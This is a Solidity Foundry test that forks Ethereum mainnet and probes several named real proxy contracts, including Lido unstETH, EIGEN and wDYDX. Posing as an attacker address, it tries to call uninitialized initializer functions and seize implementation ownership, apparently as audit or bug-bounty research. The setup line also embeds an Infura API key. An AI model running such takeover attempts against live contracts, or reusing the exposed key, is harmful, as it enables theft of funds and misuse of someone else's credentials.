// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Uninitialized Proxy Implementation Search
 * @notice Check for uninitialized implementations that could be taken over
 *
 * Classic vulnerability:
 * 1. Proxy points to implementation
 * 2. Implementation not initialized (initializer never called)
 * 3. Attacker calls initialize() on implementation directly
 * 4. Attacker becomes owner of implementation
 * 5. Attacker can call selfdestruct or manipulate implementation
 */
contract UninitializedProxySearchTest is Test {

    // EIP-1967 slots
    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    bytes32 constant ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function test_checkPausableProxyImpl() public {
        // PausableUpgradableProxy - 0xFA7093CDD9EE6932B4eb2c9e1cde7CE00B1FA4b9
        address proxy = 0xFA7093CDD9EE6932B4eb2c9e1cde7CE00B1FA4b9;

        console.log("=== PAUSABLE PROXY IMPLEMENTATION CHECK ===");

        // Get implementation
        bytes32 implSlot = vm.load(proxy, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));
        console.log("Implementation:", impl);

        if (impl == address(0)) {
            console.log("No implementation set");
            return;
        }

        // Check if implementation has owner
        (bool s, bytes memory d) = impl.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Implementation owner:", owner);

            if (owner == address(0)) {
                console.log("!!! POSSIBLE UNINITIALIZED !!!");
            }
        } else {
            console.log("No owner() function or call failed");
        }

        // Try to call initialize
        address attacker = address(0xDEAD);
        vm.prank(attacker);
        (s,) = impl.call(
            abi.encodeWithSignature("initialize()")
        );
        console.log("initialize() on impl:", s ? "SUCCESS" : "FAILED");

        // Check common init functions
        vm.prank(attacker);
        (s,) = impl.call(
            abi.encodeWithSignature("initialize(address)", attacker)
        );
        console.log("initialize(address) on impl:", s ? "SUCCESS" : "FAILED");

        console.log("============================================");
    }

    function test_checkLidoUnstETHImpl() public {
        // Lido unstETH - 0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1
        address proxy = 0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1;

        console.log("=== LIDO UNSTETH IMPLEMENTATION CHECK ===");

        bytes32 implSlot = vm.load(proxy, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));
        console.log("Implementation:", impl);

        if (impl == address(0)) {
            console.log("No implementation");
            return;
        }

        // Check owner on implementation
        (bool s, bytes memory d) = impl.staticcall(
            abi.encodeWithSignature("getContractVersion()")
        );
        if (s && d.length >= 32) {
            uint256 version = abi.decode(d, (uint256));
            console.log("Implementation version:", version);
        }

        // Try initialize
        address attacker = address(0xDEAD);
        vm.prank(attacker);
        (s,) = impl.call(
            abi.encodeWithSignature("initialize(address)", attacker)
        );
        console.log("initialize(address) on impl:", s ? "SUCCESS" : "FAILED");

        console.log("=========================================");
    }

    function test_checkMultipleProxies() public {
        console.log("=== SCANNING PROXY IMPLEMENTATIONS ===");

        // Known proxy contracts from contracts.txt
        address[5] memory proxies = [
            0xFA7093CDD9EE6932B4eb2c9e1cde7CE00B1FA4b9,  // PausableProxy
            0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1,  // Lido unstETH
            0xec53bF9167f50cDEB3Ae105f56099aaaB9061F83,  // EIGEN
            0x46b2DeAe6eFf3011008EA27EA36b7c27255ddFA9,  // wDYDX
            0x9A0C8Ff858d273f57072D714bca7411D717501D7   // st1INCH
        ];

        for (uint i = 0; i < proxies.length; i++) {
            address proxy = proxies[i];
            console.log("");
            console.log("Proxy", i, ":", proxy);

            // Get implementation
            bytes32 implSlot = vm.load(proxy, IMPL_SLOT);
            address impl = address(uint160(uint256(implSlot)));

            if (impl == address(0)) {
                // Try beacon slot
                bytes32 beaconSlot = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;
                implSlot = vm.load(proxy, beaconSlot);
                impl = address(uint160(uint256(implSlot)));
            }

            if (impl == address(0)) {
                console.log("  No implementation found");
                continue;
            }

            console.log("  Implementation:", impl);

            // Check implementation code size
            uint256 codeSize;
            assembly {
                codeSize := extcodesize(impl)
            }
            console.log("  Code size:", codeSize);

            // Try common init functions on implementation
            address attacker = address(0xBEEF);

            string[5] memory initFuncs = [
                "initialize()",
                "initialize(address)",
                "__init__()",
                "setup(address)",
                "init()"
            ];

            for (uint j = 0; j < initFuncs.length; j++) {
                vm.prank(attacker);
                (bool s,) = impl.call(
                    abi.encodeWithSignature(initFuncs[j], attacker)
                );
                if (s) {
                    console.log("  !!! SUCCESS:", initFuncs[j]);

                    // Check if we became owner
                    (bool os, bytes memory od) = impl.staticcall(
                        abi.encodeWithSignature("owner()")
                    );
                    if (os && od.length >= 32) {
                        address newOwner = abi.decode(od, (address));
                        if (newOwner == attacker) {
                            console.log("  !!! CRITICAL: Attacker is now owner !!!");
                        }
                    }
                }
            }
        }

        console.log("");
        console.log("=======================================");
    }
}
